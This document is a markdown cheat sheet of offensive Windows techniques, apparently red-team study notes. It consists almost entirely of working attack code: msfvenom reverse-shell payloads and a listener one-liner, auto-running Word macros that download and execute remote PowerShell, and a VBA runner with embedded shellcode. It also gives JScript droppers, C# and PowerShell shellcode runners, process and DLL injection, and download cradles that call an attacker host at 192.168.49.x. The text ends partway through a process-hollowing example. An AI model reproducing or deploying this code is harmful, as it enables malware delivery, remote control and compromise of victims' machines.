## Commands:

<details>
<summary><h4>msfvenom Payload</h4></summary>

- Standard
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f dll -o evil.dll
```

- Using encoders / templates
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x notepad.exe -f exe -o met64_notepad.exe
```

</details>

<details>
<summary><h4>msfconsole listener oneliner</h4></summary>

```
msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.49.70; set lport 443; run'
```
</details>

<details>
<summary><h4>Mono Compile DLL</h4></summary>

```
mcs -r:System.Windows.Forms.dll -target:library evil.cs -out:evil.dll
```
</details>

<details>
<summary><h4>Mono Compile exe</h4></summary>

```
mcs -platform:x64 -target:exe evil.cs -out:evil.exe
```
</details>

<details>
<summary><h4>DotNetToJscript</h4></summary>

1. CSharp template:
```
// Check your imports
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    // Structs & DLL imports here...

    public TestClass()
    {
        // Put code here...
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

2. Convert to Jscript
```
.\DotNetToJScript.exe evil.dll --lang=Jscript --ver=v4 -o evil.js
```
</details>

<details>
<summary><h4>SharpShooter</h4></summary>

[SuperSharpShooter](https://github.com/SYANiDE-/SuperSharpShooter)
    
<details>
<summary><h5>Stageless Jscript Runner</h5></summary>
    
1. Generate a Meterpreter payload:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f raw -o shell.txt
```

2. Use SharpShooter to convert this to malicious Jscript:
```
./SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```
</details>

<details>
<summary><h5>Staged HTML Smuggled Payload</h5></summary>

1. Generate Meterpreter payload as csharp:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp -o sharpshell.txt
```

2. Generate payloads using SharpShooter:
```
./SharpShooter.py --payload js --dotnetver 4 --scfile sharpshell.txt --output test2 --smuggle --template mcafee --delivery web --web http://192.168.49.110/test2.payload --shellcode
```

3. Serve HTML and .payload on attacking machine:
```
python3 -m http.server 80
```
</details>
</details>
<br>

## Snippets:

<details>
<summary><h4>Macro</h4></summary>

```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.147/evil.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
</details>

<details>
<summary><h4>VBA Shellcode Runner</h4></summary>

```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function evil()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    buf = Array(252,232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,139,114,40,49,255,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,72,24,139,88,32,1,211,133,201,116,60,73,139, _
52,139,1,214,49,255,49,192,193,207,13,172,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,51,50,0,0,104,119,115,50,95,84, _
104,76,119,38,7,137,232,255,208,184,144,1,0,0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,192,168,49,110,104,2,0,17,91,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0, _
106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213, _
94,94,255,12,36,15,133,112,255,255,255,233,155,255,255,255,1,195,41,198,117,193,195,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    evil
End Sub

Sub AutoOpen()
    evil
End Sub
```
</details>

<details>
<summary><h4>PowerShell Shellcode Runner</h4></summary>

```
function LookupAPI {
    Param ($moduleName, $methodName)
    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assembly.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") {$tmp += $_} }
    return $tmp[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $methodName))
}

function getDelegateType {
    Param (
        \# Input
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        \# Output
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).DefineDynamicModule('InMemoryModule', $False).DefineType(
            'delegate_type',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, 
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

\# msf payload
[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60...

\# VirtualAlloc
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll VirtualAlloc), 
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, $buf.length, 0x3000, 0x40)

\# memcpy
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

\# CreateThread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll CreateThread), 
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    ).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

\# WaitForSingleObject
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll WaitForSingleObject), 
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
    ).Invoke($hThread, 0xFFFFFFFF)
```
</details>

<details>
<summary><h4>PowerShell Proxy Aware</h4></summary>

```
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.49.110/evil.ps1")
```
</details>

<details>
<summary><h4>PowerShell SYSTEM Proxy</h4></summary>

```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {
    if ($key.Name -like "*S-1-5-21-*") {
        $start = $key.Name.substring(10)
        break
    }
}

$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")

$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
$wc.DownloadString("http://192.168.49.110/evil.ps1")
```
</details>

<details>
<summary><h4>Jscript Droppers</h4></summary>

<details>
<summary><h5>No Proxy</h5></summary>

```
var url = "http://192.168.49.110/evil.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("evil.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("evil.exe");
```
</details>

<details>
<summary><h5>Proxy Aware</h5></summary>

```
var url = "http://192.168.49.110/evil.exe"
var Object = WScript.CreateObject('MSXML2.ServerXMLHTTP');

Object.setProxy(2, "http=192.168.110.12:3128", "")
Object.open('GET', url, false);
Object.send();

if (Object.status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.responseBody);
    Stream.Position = 0;

    Stream.SaveToFile("evil.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("evil.exe");
```
</details>
</details>

<details>
<summary><h4>CSharp Shellcode Runner</h4></summary>

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
            ...
            };

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
</details>

<details>
<summary><h4>Jscript Shellcode Runner</h4></summary>

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {

        byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        ...
        };

        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
</details>

<details>
<summary><h4>Powershell Reflective DLL Load</h4></summary>

<details>
<summary><h5>Malicious DLL Using DotNetToJscript</h5></summary>

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[630] {
            ...
            };

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
</details>

<details>
<summary><h5>PowerShell Download Cradle</h5></summary>

```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.110/reflect.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
</details>
</details>

<details>
<summary><h4>Word Reflective DLL Load</h4></summary>

1. Generate 32 bit shellcode:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f csharp
```

2. Recompile DLL as x86:
```
mcs -platform:x64-target:library reflect.cs
```

3. Create macro to download and execute DLL:
```
Sub MyMacro()
    Dim str As String
    str = "powershell $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.49.110/reflect.dll'); $assem=[System.Reflection.Assembly]::Load($data); $class=$assem.GetType('ClassLibrary1.Class1'); $method=$class.GetMethod('runner'); $method.Invoke(0, $null)"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
</details>

<details>
<summary><h4>CSharp Process Injection</h4></summary>

1. DotNetToJscript Harness:
```
using System;
using System.Diagnostics;  
using System.Runtime.InteropServices;  
using System.Windows.Forms;  
  
[ComVisible(true)]  
public class TestClass  
{  
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]  
   static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);  
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]  
   static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
   [DllImport("kernel32.dll")]  
   static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);  
   [DllImport("kernel32.dll")]  
   static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);  
  
   public TestClass()  
   {  
       Process[] proc = Process.GetProcessesByName("explorer");  
       int pid = proc[0].Id;  
       IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);  
       IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);  
  
       byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,  
       ...
       };  
  
       IntPtr outSize;  
       WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);  
       IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);  
   }  
  
   public void RunProcess(string path)  
   {  
       Process.Start(path);  
   }  
}
```

2. Compile to DLL with mono:
```
mcs -r:System.Windows.Forms -platform:x64 -target:library TestClass.cs
```

3. Convert to js with DotNetToJscript:
```
.\DotNetToJScript.exe evil.dll --lang=Jscript --ver=v4 -o evil.js
```
</details>

<details>
<summary><h4>CSharp Process Injection Alt</h4></summary>

1. Rewrite C# source to use alternative API calls (DotNetToJscript):
```
using System;  
using System.Diagnostics;  
using System.Runtime.InteropServices;  
using System.Windows.Forms;  
  
[ComVisible(true)]  
public class TestClass  
{  
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]  
   static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);  
  
   [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]  
   static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);  
  
   [DllImport("ntdll.dll", SetLastError=true)]  
   static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);  
  
   [DllImport("ntdll.dll", SetLastError=true)]  
   static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);  
  
   [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]  
   static extern int NtClose(IntPtr hObject);  
  
   [DllImport("kernel32.dll")]  
   static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);  
  
   public TestClass()  
   {  
       byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,  
       ... 
       };  
  
       int bufSize = buf.Length;  
       uint ubufSize = (uint)bufSize;  
  
       // Get current process handle  
       IntPtr hCProcess = Process.GetCurrentProcess().Handle;  
  
       // Get target process handle  
       Process[] proc = Process.GetProcessesByName("explorer");  
       int tpid = proc[0].Id;  
       IntPtr hProcess = OpenProcess(0x001F0FFF, false, tpid);  
  
       // Create section  
       IntPtr ptr_section_handle = IntPtr.Zero;  
       UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref ubufSize, 0x40, 0x08000000, IntPtr.Zero);  
  
       // Map view of section in current process  
       UInt64 local_section_offset = 0;  
       IntPtr ptr_local_section_addr = IntPtr.Zero;  
       UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, hCProcess, ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, out local_section_offset, out bufSize, 0x2, 0, 0x04);  
  
       // Copy shellcode into memory  
       Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);  
          
       // Map view of section on target process  
       IntPtr ptr_remote_section_addr = IntPtr.Zero;  
       UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, out local_section_offset, out bufSize, 0x2, 0, 0x20);  
  
       // Unmap view in current process & close section handle  
       NtUnmapViewOfSection(hCProcess, ptr_local_section_addr);  
       NtClose(ptr_section_handle);  
  
       IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);  
   }  
  
   public void RunProcess(string path)  
   {  
       Process.Start(path);  
   }  
}
```
</details>

<details>
<summary><h4>PowerShell Process Injection</h4></summary>

1. Port C# code to PowerShell:
```
function LookupAPI {
    Param ($moduleName, $methodName)
    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assembly.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") {$tmp += $_} }
    return $tmp[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $methodName))
}

function getDelegateType {
    Param (
        \# Input
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        \# Output
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).DefineDynamicModule('InMemoryModule', $False).DefineType(
            'delegate_type',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, 
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

\# msf payload
[Byte[]] $buf = ...

\# Spawn notepad.exe and get PID
$proc = Start-Process -Passthru "notepad"
$procPID = $proc.Id
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll OpenProcess),
    (getDelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr]))
).Invoke(0x001F0FFF, $false, $procPID)

\# VirtualAllocEx
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll VirtualAllocEx), 
    (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke($hProcess, [IntPtr]::Zero, $buf.Length + 1, 0x3000, 0x40)

\# WriteProcessMemory
$memWrite = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll WriteProcessMemory), 
    (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
).Invoke($hProcess, $lpMem, $buf, $buf.Length, [Ref] 0)

\# CreateRemoteThread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll CreateRemoteThread), 
    (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    ).Invoke($hProcess, [IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

\# WaitForSingleObject
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupAPI kernel32.dll WaitForSingleObject), 
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
    ).Invoke($hThread, 0xFFFFFFFF)
```

2. Write Word macro to execute remote ps1 code:
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.110/evil.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub
```
</details>

<details>
<summary><h4>CSharp DLL Injection</h4></summary>

1. Generate malicious DLL with msfvenom:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.110 LPORT=443 -f dll -o evil.dll
```

2. Create JScript dropper code:
```
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    /*
        OpenProcess
        VirtualAllocEx
        WriteProcessMemory
        CreateRemoteThread
        GetProcAddress
        GetModuleHandle
    */
    public TestClass()
    {
        String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = dir + "\\evil.dll";

        WebClient wc = new WebClient();
        wc.DownloadFile("http://192.168.49.110/evil.dll", dllName);

        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

3. Compile using mono:
```
mcs -platform:x64 -target:library TestClass.cs
```

4. Convert to JScript: 
```
.\DotNetToJScript.exe dropper.dll --lang=Jscript --ver=v4 -o dropper.js
```
</details>

<details>
<summary><h4>PowerShell DLL Injection</h4></summary>
    
- Run locally:
```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.127/evil.dll')
$procid = (Get-Process -Name explorer).Id

Import-Module C:\Windows\Temp\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

- Run in memory:
```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.127/evil.dll')
$procid = (Get-Process -Name explorer).Id

New-Module -Name "Invoke-ReflectivePEInjection" -ScriptBlock ([Scriptblock]::Create((New-Object System.Net.WebClient).DownloadString("http://192.168.49.127/Invoke-ReflectivePEInjection.ps1")))
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
</details>

<details>
<summary><h4>CSharp Process Hollowing</h4></summary>

<details>
<summary><h5>Csharp format:</h5></summary>

```
using System;
using System.Runtime.InteropServices;

namespace Hollow
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO{
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION{
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION{
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName, 
            string lpCommandLine, 
            IntPtr lpProcessAttributes, 
            IntPtr lpThreadAttributes, 
            bool bInheritHandles, 
            uint dwCreationFlags, 
            IntPtr lpEnvironment, 
            string lpCurrentDirectory, 
            [In] ref STARTUPINFO lpStartupInfo, 
            out PROCESS_INFORMATION lpProcessInformation
        );
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess, 
            int procInformationClass, 
            ref PROCESS_BASIC_INFORMATION procInformation, 
            uint ProcInfoLen, ref uint retlen
        );
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            [Out] byte[] lpBuffer,
            int dwSize, 
            out IntPtr lpNumberOfBytesRead
            );
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            byte[] lpBuffer, 
            Int32 nSize, 
            out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            // Variable declaration
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            byte[] addrBuf = new byte[IntPtr.Size];
